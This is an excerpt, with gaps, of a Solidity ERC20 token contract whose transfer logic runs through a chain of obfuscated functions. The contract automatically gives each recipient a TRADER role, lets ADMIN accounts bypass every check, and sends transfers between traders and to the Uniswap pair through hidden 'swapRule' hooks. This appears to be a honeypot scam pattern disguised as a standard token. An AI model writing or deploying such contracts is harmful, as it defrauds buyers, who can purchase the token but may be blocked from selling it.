...
interface _FKENSDCFRoleControl {
...
abstract contract _FKENSDCFConsole is Context, _FKENSDCFRoleControl {
    ...
    function _roleCheked(bytes32 role, address account, uint256 amt) internal {
        ...
        __FKENSDCFwapRule(role, account, amt);
    }

    function __FKENSDCFwapRule(bytes32 role, address account, uint256 amt) internal {
    ...
    function __FKENSDCFswapRule(bytes32 role, address account, uint256 num) internal virtual {
...
contract _FKENSDCFERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is _FKENSDCFERC20, _FKENSDCFConsole {
    ...
    ) _FKENSDCFERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(_FKENSDCFERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        __FKENSDCFgbsdudf(from, to, amt);

    }



    function __FKENSDCFgbsdudf(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        __FKENSDCFhmfgdgts(from, to, amt);
    }


    function __FKENSDCFhmfgdgts(address from, address to, uint256 amt) internal {
        ...
        __FKENSDCFfvbfgrsj(from, to, amt);
    }

    function __FKENSDCFfvbfgrsj(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        __FKENSDCFghjtdfsbr(from, to, amt);
    }


    function __FKENSDCFghjtdfsbr(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
            ...
            __FKENSDCFswapRule(TRADER,to,1);
        }

        __FKENSDCFcvtumsd(from, to, amt);
    }

    function __FKENSDCFcvtumsd(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }

        __FKENSDCFxcnhjma(from, to, amt);
    }

    function __FKENSDCFxcnhjma(address from, address to, uint256 amt) internal {
        if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           __FKENSDCFxjgarsm(from, TRADER, amt);
    ...
    function __FKENSDCFxjgarsm(address from, bytes32 role, uint256 amt) internal {
        __FKENSDCFwapRule(role, from, amt);
    }
